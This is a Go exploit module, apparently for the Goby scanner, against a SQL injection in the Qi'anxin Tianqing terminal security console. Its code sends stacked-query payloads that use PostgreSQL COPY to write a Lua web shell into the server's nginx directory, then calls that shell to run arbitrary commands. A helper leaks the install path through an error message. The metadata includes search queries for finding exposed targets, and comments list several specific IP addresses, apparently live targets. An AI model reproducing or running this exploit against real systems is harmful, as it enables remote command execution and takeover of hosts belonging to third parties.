package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tianqing Terminal Security Management System clientinfobymid method SQL Injection Lead to Command Execution Vulnerability",
    "Description": "<p>Qi'an Xintianqing terminal security management system is an integrated terminal security product solution for government and enterprise units. The product integrates functions such as antivirus, terminal security control, terminal access, terminal auditing, peripheral management and control, and EDR. It is compatible with different operating systems and computing platforms, helping customers achieve platform integration, function integration, and data integration. Terminal security three-dimensional protection.</p><p>There is a SQL injection vulnerability in the console of Qi'an Xintianqing terminal security management system. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "Qi Anxin-Tianqing",
    "Homepage": "https://www.qianxin.com/",
    "DisclosureDate": "2022-08-01",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "title=\"360新天擎\" || body=\"appid\\\":\\\"skylar6\" || body=\"/task/index/detail?id={item.id}\" || body=\"已过期或者未授权，购买请联系4008-136-360\" || title=\"360天擎\" || title=\"360天擎终端安全管理系统\"",
    "GobyQuery": "title=\"360新天擎\" || body=\"appid\\\":\\\"skylar6\" || body=\"/task/index/detail?id={item.id}\" || body=\"已过期或者未授权，购买请联系4008-136-360\" || title=\"360天擎\" || title=\"360天擎终端安全管理系统\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in the console of Qi'an Xintianqing terminal security management system. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. The manufacturer has fixed this vulnerability and upgraded to the latest version</p><p><a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2. Deploy a web application firewall to monitor database operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [
        "https://www.qshu1.com/2022/04/11/%E5%A4%A9%E6%93%8ESQL%E6%B3%A8%E5%85%A5/",
        "2519638032bb1a78b963118eb7741732"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        },
        {
            "name": "port",
            "type": "input",
            "value": "80",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/terminal/clientinfobymid",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{\"mids\":{\"1 ,:mid_1);select a -- aa\":\"\",\"1\":1}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"data\":[]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/api/terminal/clientinfobymid",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{\"mids\":{\"1 ,:mid_1);select 'aaa' -- aa\":\"\",\"1\":1}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "data\":[{\"?column?\":\"aaa\"}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "天擎终端安全管理系统clientinfobymid方法SQL注入导致命令执行漏洞",
            "Product": "奇安信-天擎",
            "Description": "<p>奇安信天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。该产品集防病毒、终端安全管控、终端准入、终端审计、外设管控、EDR等功能于一体，兼容不同操作系统和计算平台，帮助客户实现平台一体化、功能一体化、数据一体化的终端安全立体防护。</p><p>奇安信天擎终端安全管理系统控制台存在SQL注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、厂商已经修复此漏洞，升级至最新版本 <a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a></p><p>2、部署web应用防火墙，对数据库操作进行监控</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">奇安信天擎终端安全管理系统控制台存在SQL注入漏洞。</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Tianqing Terminal Security Management System clientinfobymid method SQL Injection Lead to Command Execution Vulnerability",
            "Product": "Qi Anxin-Tianqing",
            "Description": "<p>Qi'an Xintianqing terminal security management system is an integrated terminal security product solution for government and enterprise units. The product integrates functions such as antivirus, terminal security control, terminal access, terminal auditing, peripheral management and control, and EDR. It is compatible with different operating systems and computing platforms, helping customers achieve platform integration, function integration, and data integration. Terminal security three-dimensional protection.</p><p>There is a SQL injection vulnerability in the console of Qi'an Xintianqing terminal security management system. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. The manufacturer has fixed this vulnerability and upgraded to the latest version</p><p><a href=\"https://www.qianxin.com/\">https://www.qianxin.com/</a><br></p><p>2. Deploy a web application firewall to monitor database operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">There is a SQL injection vulnerability in the console of Qi'an Xintianqing terminal security management system.&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7306"
}`
	// https://183.215.124.72:8443
	// http://183.166.187.208:8090
	// https://59.175.207.60:8443
	// https://218.31.125.51:8443
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			port := ss.Params["port"].(string)
			ip := expResult.HostInfo.IP
			cmd = url.PathEscape(cmd)
			fileName := "test_upload_test_test12"
			uri := fmt.Sprintf("http://%s:%s/api/%s.json?cmd=%s", ip, port, fileName, cmd)
			if resp, err := httpclient.SimpleGet(uri); err == nil && resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			} else {
				root_path := get_root(expResult.HostInfo)
				if root_path == "error" {
					expResult.Success = true
					expResult.Output = "vul_url：" + expResult.HostInfo.FixedHostInfo + "/api/terminal/clientinfobymid\r\n\r\npost参数：{\"mids\":{\"1 ,:mid_1);create table O(T TEXT);insert into O(T) values('if ngx.req.get_uri_args().cmd then cmd = ngx.req.get_uri_args().cmd local t = io.popen(cmd) local a = t:read(\\u0022*all\\u0022) ngx.say(a) end');copy O(T) to 'D:/Program Files (x86)/QAX/skylar6/nginx/lua/test_upload_test_test.luac';drop table O; -- aa\":\"\",\"1\":1}}"
				} else {
					uri1 := "/api/terminal/clientinfobymid"
					cfg1 := httpclient.NewPostRequestConfig(uri1)
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					cfg1.Header.Store("X-Requested-With", "XMLHttpRequest")
					cfg1.Header.Store("Content-Type", "application/json")
					fileContent := "if ngx.req.get_uri_args().cmd then cmd = ngx.req.get_uri_args().cmd local t = io.popen(cmd) local a = t:read(\\u0022*all\\u0022) ngx.say(a) end"
					cfg1.Data = "{\"mids\":{\"1 ,:mid_1);create table O(T TEXT);insert into O(T) values('" + fileContent + "');copy O(T) to '" + root_path + "nginx/lua/" + fileName + ".luac';drop table O;-- aa\":\"\",\"1\":1}}"
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
						if resp, err = httpclient.SimpleGet(uri); err == nil && resp.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = resp.Utf8Html
						} else {
							expResult.Success = true
							expResult.Output = "vul_url：" + expResult.HostInfo.FixedHostInfo + "/api/terminal/clientinfobymid\r\n\r\npost参数：{\"mids\":{\"1 ,:mid_1);create table O(T TEXT);insert into O(T) values('if ngx.req.get_uri_args().cmd then cmd = ngx.req.get_uri_args().cmd local t = io.popen(cmd) local a = t:read(\\u0022*all\\u0022) ngx.say(a) end');copy O(T) to '" + root_path + "nginx/lua/test_upload_test_test.luac';drop table O; -- aa\":\"\",\"1\":1}}"
						}
					} else {
						expResult.Success = true
						expResult.Output = "vul_url：" + expResult.HostInfo.FixedHostInfo + "/api/terminal/clientinfobymid\r\n\r\npost参数：{\"mids\":{\"1 ,:mid_1);create table O(T TEXT);insert into O(T) values('if ngx.req.get_uri_args().cmd then cmd = ngx.req.get_uri_args().cmd local t = io.popen(cmd) local a = t:read(\\u0022*all\\u0022) ngx.say(a) end');copy O(T) to '" + root_path + "nginx/lua/test_upload_test_test.luac';drop table O; -- aa\":\"\",\"1\":1}}"
					}
				}
			}
			return expResult
		},
	))
}

func get_root(u *httpclient.FixUrl) string {
	uri := "/api/terminal/clientinfobymid"
	cfg := httpclient.NewPostRequestConfig(uri)
	cfg.VerifyTls = false
	cfg.FollowRedirect = false
	cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
	cfg.Header.Store("Content-Type", "application/json")
	cfg.Data = "{\"mids\":1}"
	if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "integer given, called") {
		a := strings.Replace(resp.RawBody, "\\", "/", -1)
		syst := regexp.MustCompile("integer given, called in (.*?)www/ext/edr/www/source/domain/dao/EdrDao")
		path := syst.FindStringSubmatch(a)
		root_path := path[1]
		return root_path
	} else {
		return "error"
	}
}
